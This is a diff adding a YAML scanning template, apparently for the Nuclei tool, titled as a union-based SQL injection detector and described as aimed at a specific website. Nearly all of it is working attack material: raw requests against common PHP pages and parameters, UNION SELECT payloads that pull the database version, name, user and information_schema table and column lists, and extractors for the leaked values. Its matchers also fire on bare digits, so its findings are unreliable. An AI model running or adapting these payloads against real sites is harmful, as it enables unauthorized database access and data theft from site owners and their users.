@@ -1,0 +1,101 @@
+id: custom-union-sqli-detector
+
+info:
+  name: Custom Union-Based SQLi Detector
+  author: DAAKU
+  severity: critical
+  description: Custom template for specific website with union-based SQLi
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?{{param}}={{original_value}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+        
+      - |
+        GET /{{path}}?{{param}}={{payload_1}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+        
+      - |
+        GET /{{path}}?{{param}}={{payload_2}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Connection: close
+
+    payloads:
+      param:
+        - "id"
+        - "page"
+        - "product_id"
+        - "cat_id"
+        - "news_id"
+        - "article_id"
+        
+      path:
+        - "product.php"
+        - "products.php"
+        - "item.php"
+        - "details.php"
+        - "view.php"
+        - "news.php"
+        - "article.php"
+        
+      original_value:
+        - "1"
+        - "2"
+        - "3"
+        - "5"
+        - "10"
+        
+      payload_1:
+        - "-1' UNION SELECT 1,2,3,4,5-- -"
+        - "-1\" UNION SELECT 1,2,3,4,5-- -"
+        - "-1 UNION SELECT 1,2,3,4,5-- -"
+        - "-1' UNION ALL SELECT 1,2,3,4,5-- -"
+        - "-1' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -"
+        
+      payload_2:
+        - "-1' UNION SELECT 1,@@version,3,4,5-- -"
+        - "-1' UNION SELECT 1,database(),3,4,5-- -"
+        - "-1' UNION SELECT 1,user(),3,4,5-- -"
+        - "-1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -"
+        - "-1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns-- -"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, '2') || contains(body_2, '3') || contains(body_2, '4') || contains(body_2, '5')"  # Union numbers visible?
+          - "len(body_2) != len(body_1)"  # Different length from original
+          - "status_code_2 == 200"  # Still 200 OK
+          
+      - type: word
+        part: body_2
+        words:
+          - "2"
+          - "3"
+          - "4"
+          - "5"
+          - "@@version"
+          - "database()"
+          - "user()"
+          - "information_schema"
+        condition: or
+        
+    extractors:
+      - type: regex
+        part: body_2
+        regex:
+          - "[0-9]+\.[0-9]+\.[0-9]+-log"  # MySQL version
+          - "[0-9]+\.[0-9]+\.[0-9]+"       # Version numbers
+          - "root@localhost"                 # MySQL user
+          - "[a-zA-Z0-9_]+_schema"          # information_schema
